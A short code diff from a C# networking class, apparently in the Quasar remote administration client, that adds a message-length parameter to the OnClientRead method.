@@ -67,7 +67,7 @@ namespace Quasar.Client.Networking
             }
         }
 
-        private void OnClientRead(Client client, IMessage message)
+        private void OnClientRead(Client client, IMessage message, int messageLength)
         {
             if (!Identified)
             {
